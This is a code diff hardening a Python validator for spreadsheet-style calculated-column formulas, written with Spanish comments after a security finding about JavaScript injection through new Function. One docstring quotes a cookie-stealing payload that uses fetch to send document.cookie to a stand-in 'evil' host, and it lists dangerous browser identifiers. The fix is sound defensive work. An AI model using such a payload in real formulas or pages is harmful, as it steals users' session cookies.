@@ -58,7 +58,9 @@ from typing import Any
 _SCOPED_BRACE_RE = re.compile(r"\b(total|col|row)\.\{\{\s*([^}]+?)\s*\}\}", re.ASCII)
 _SCOPED_BARE_RE = re.compile(r"\b(total|col|row)\.(\w+)\b", re.ASCII)
 _COLUMN_REF_RE = re.compile(r"\{\{\s*([^}]+?)\s*\}\}")
-_FUNCTION_ALIAS_RE = re.compile(r"\b([A-Z_][A-Z0-9_]*)\b", re.ASCII)
+# Cualquier identificador estilo JS, no solo ALL-CAPS -- ver
+# extract_unknown_function_tokens (hallazgo de seguridad 2026-09-29).
+_IDENTIFIER_RE = re.compile(r"\b[A-Za-z_][A-Za-z0-9_]*", re.ASCII)
 
 # Mismo mapa que FUNCTION_ALIASES en calculatedColumns.ts — TRUE/FALSE/
 # NULL/NAN cuentan como conocidos aunque no sean funciones (se traducen a
@@ -102,21 +104,79 @@ def extract_calculated_column_references(expression: str) -> list[str]:
     return names
 
 
-def extract_unknown_function_tokens(expression: str) -> list[str]:
-    """Identificadores en MAYÚSCULAS fuera de cualquier `{{...}}` (los dos
-    estilos, con y sin llaves) que no son ninguna de las funciones/
-    literales seguros conocidos — típicamente una función mal escrita
-    (ej. `SUM` en vez de una de las soportadas) que el compilador real deja
-    pasar sin traducir y que `new Function(...)` revienta en silencio al
-    construir el evaluador (capturado por el `catch` externo)."""
+def _mask_string_literals(text: str) -> str:
+    """Reemplaza el CONTENIDO de literales de string ('...'/"...") por
+    espacios (misma longitud, respeta escapes con \\) — así un identificador
+    que solo aparece DENTRO de un string (ej. "hello" en
+    IF({{x}}='hello world', 1, 0)) no se confunde con código real."""
+    chars = list(text)
+    i, n = 0, len(chars)
+    while i < n:
+        if chars[i] in ("'", '"'):
+            quote = chars[i]
+            j = i + 1
+            while j < n and chars[j] != quote:
+                if chars[j] == "\\" and j + 1 < n:
+                    chars[j] = chars[j + 1] = " "
+                    j += 2
+                    continue
+                chars[j] = " "
+                j += 1
+            i = j + 1 if j < n else j
+            continue
+        i += 1
+    return "".join(chars)
+
+
+def extract_unknown_function_tokens(
+    expression: str, known_names: Sequence[str] | None = None
+) -> list[str]:
+    """Identificadores fuera de cualquier `{{...}}` (los dos estilos, con y
+    sin llaves) y fuera de literales de string, que no son ninguna de las
+    funciones/literales seguros conocidos (KNOWN_FUNCTION_ALIASES).
+
+    Hasta 2026-09-29 esto solo miraba identificadores TODO EN MAYÚSCULA
+    (`_FUNCTION_ALIAS_RE` original) — pero el compilador real
+    (`FUNCTION_ALIAS_REGEX` en calculatedColumns.ts) también SOLO traduce
+    nombres ALL-CAPS y deja pasar intacto CUALQUIER otro identificador
+    (`fetch`, `document`, `window`, `eval`, `constructor`, o incluso un
+    `total`/`row` suelto sin `.`) hasta `new Function(...)`, que no aísla
+    del scope global del navegador. Hallazgo de seguridad 2026-09-29:
+    `(1, fetch('https://evil/steal?c='+document.cookie))` no tiene ninguna
+    palabra en mayúsculas y compilaba/ejecutaba sin error — este validador
+    lo daba por `valid: true`. Por eso ahora se exige allowlist ESTRICTA:
+    CUALQUIER identificador que sobreviva el enmascarado de referencias/
+    strings y no esté en KNOWN_FUNCTION_ALIASES (comparación exacta,
+    sensible a mayúsculas, igual que el compilador real) se reporta como no
+    reconocido. La corrección real y definitiva está en el compilador del
+    navegador (`calculatedColumns.ts::findDisallowedIdentifier`, mismo
+    hallazgo) — este validador es una segunda barrera para que el modelo
+    reciba `valid:false` con motivo en vez de una fórmula que compila
+    "vacía" (o, antes de este fix, que compilaba y corría de verdad).
+
+    `known_names` (opcional) replica una asimetría real del compilador: un
+    `scope.{{Nombre}}` (CON llaves) SIEMPRE se sustituye por un getter,
+    resuelva o no -- pero un `scope.Nombre` SIN llaves (`SCOPED_BARE_REGEX`
+    en calculatedColumns.ts) solo se sustituye SI `Nombre` es una columna/
+    métrica real (`if (!key) return match;` deja el texto ORIGINAL intacto
+    si no). Sin este parámetro (o con una fórmula sin `scope.Nombre` sin
+    llaves), el comportamiento no cambia -- pero si SÍ hay un `scope.Nombre`
+    que no resuelve (ej. `total.constructor`), enmascararlo incondicional-
+    mente escondería el propio `total`/`col`/`row` del escaneo de abajo."""
+    known_lower = {name.lower() for name in (known_names or ())}
+
     scoped_brace_matches = list(_SCOPED_BRACE_RE.finditer(expression))
     remaining = _mask_spans(expression, [m.span() for m in scoped_brace_matches])
+
     scoped_bare_matches = list(_SCOPED_BARE_RE.finditer(remaining))
-    remaining = _mask_spans(remaining, [m.span() for m in scoped_bare_matches])
+    resolvable_spans = [m.span() for m in scoped_bare_matches if m.group(2).lower() in known_lower]
+    remaining = _mask_spans(remaining, resolvable_spans)
+
     plain_matches = list(_COLUMN_REF_RE.finditer(remaining))
     remaining = _mask_spans(remaining, [m.span() for m in plain_matches])
+    remaining = _mask_string_literals(remaining)
 
-    tokens = [m.group(1) for m in _FUNCTION_ALIAS_RE.finditer(remaining)]
+    tokens = [m.group(0) for m in _IDENTIFIER_RE.finditer(remaining)]
     seen: list[str] = []
     for token in tokens:
         if token not in KNOWN_FUNCTION_ALIASES and token not in seen:
@@ -229,14 +289,14 @@ def formula_validation_result(
         elif ref not in unknown:
             unknown.append(ref)
 
-    unknown_functions = extract_unknown_function_tokens(trimmed)
+    unknown_functions = extract_unknown_function_tokens(trimmed, known_names)
 
     if unknown or unknown_functions:
         error_parts: list[str] = []
         if unknown:
             error_parts.append(f"columnas/métricas no encontradas: {', '.join(unknown)}")
         if unknown_functions:
-            error_parts.append(f"funciones no reconocidas: {', '.join(unknown_functions)}")
+            error_parts.append(f"identificadores/funciones no reconocidos: {', '.join(unknown_functions)}")
         return {
             "valid": False,
             "error": "La fórmula referencia " + "; ".join(error_parts) + ".",
